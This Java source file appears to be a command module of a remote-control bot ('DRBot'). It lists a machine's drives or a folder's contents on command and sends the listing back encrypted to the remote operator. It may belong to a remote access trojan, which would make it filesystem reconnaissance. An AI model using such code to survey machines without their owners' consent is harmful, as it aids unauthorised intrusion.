package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.io.PrintWriter;
import java.io.IOException;
import java.util.List;
import java.util.ArrayList;
import java.util.Iterator;

/**
 *
 * @author MerNat
 */

public class driveinf implements Runnable{
    
    private final List<String> allDrives;
    private final List<String> allFiles;
    private String result;
    private final PrintWriter writer;
    private String[] fullCommands;
    private File[] paths;
    private File tempDir;
    private FileSystemView fsv;
    private final SecureLine secureLine;
    
    driveinf(String[] commands,PrintWriter writer,SecureLine secureLine) throws IOException{
        result = "";
        allDrives = new ArrayList<>();
        allFiles = new ArrayList<>();
        this.writer = writer;
        this.secureLine = secureLine;
        try{
        fullCommands = new String[commands.length-1];
        for(int i = 1;i<commands.length;i++){
            fullCommands[i-1] = commands[i];
        }  
        }
        catch(NullPointerException nullPointer){
            
        }
        
        
    }
    
    @Override
    public void run(){
        switch (fullCommands[0]) {
            case "-list":
                paths = File.listRoots();
                fsv = FileSystemView.getFileSystemView();
                for(File temp:paths){
                    allDrives.add("[" + temp + "~" + fsv.getSystemDisplayName(temp)+" Type:"+fsv.getSystemTypeDescription(temp)+"] ---- ");
                }   Iterator<String> iter1 = allDrives.iterator();
            while(iter1.hasNext()){
                result += iter1.next();
            }   try{
                toPrint(result);
            }
            catch(IOException ioExc){
            }   result = "";
                break;
            case "-listD":
                tempDir = new File(fullCommands[1].replace("*", ":").replace("\\", "\\\\").replace("_"," "));
                if(tempDir.exists()){
                    paths = tempDir.listFiles();
                    for(File temp:paths){
                        allFiles.add("[" + checkFile(temp)+"~"+temp+"] ----");
                    }
                    if(allFiles.size()<=20){
                        Iterator<String> iter2 = allFiles.iterator();
                    while(iter2.hasNext()){
                        result += iter2.next();
                    }
                    try{
                        toPrint(result);
                        result = "";
                    }
                    catch(IOException eio){
                        }
                    }
                    else
                        if(allFiles.size()>20 && allFiles.size()<=40){
                            List<String> list1 = allFiles.subList(0,allFiles.size()/2);
                            List<String> list2 = allFiles.subList(allFiles.size()/2,allFiles.size());
                            
                            Iterator<String> iter1s = list1.iterator();
                            Iterator<String> iter2s = list2.iterator();
                            while(iter1s.hasNext()){
                                result += iter1s.next();
                            }
                            try{
                                toPrint(result);
                                result = "";
                            }
                            catch(IOException dfjk){}
                            while(iter2s.hasNext()){
                                result += iter2s.next();
                            }
                            try{
                                toPrint(result);
                                result = "";
                            }
                            catch(IOException dlj){}
                        }
                    else
                            if(allFiles.size()>40){
                                
                                List<String> list1 = allFiles.subList(0,(allFiles.size()/3));
                                List<String> list2 = allFiles.subList(allFiles.size()/3,(allFiles.size()*2)/3);
                                List<String> list3 = allFiles.subList((allFiles.size()*2)/3, allFiles.size());
                                
                                Iterator<String> iter1s = list1.iterator();
                                Iterator<String> iter2s = list2.iterator();
                                Iterator<String> iter3s = list3.iterator();
                                
                                while(iter1s.hasNext()){
                                result += iter1s.next();
                            }
                            try{
                                toPrint(result);
                                result = "";
                            }
                            catch(IOException dfjk){}
                            while(iter2s.hasNext()){
                                result += iter2s.next();
                            }
                            try{
                                toPrint(result);
                                result = "";
                            }
                            catch(IOException dlj){}
                                
                            while(iter3s.hasNext()){
                                result += iter3s.next();
                                }
                            try{
                                toPrint(result);
                                result = "";
                            }
                            catch(IOException dljf){}
                            }
                }
                else{
                    if(!tempDir.exists()){
                        try{
                            toPrint("[driveinf] The Folder you are specifying does not exist.");
                        }
                        catch(IOException ioException){
                        }
                    }
                }
                break;
        }

    }
    
    private void toPrint(String toPrint)throws IOException{
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
    private String checkFile(File toCheck){
        if(toCheck.isFile()){
            return "File";
        }
        else{
            return "Dir";
        }
    }
}
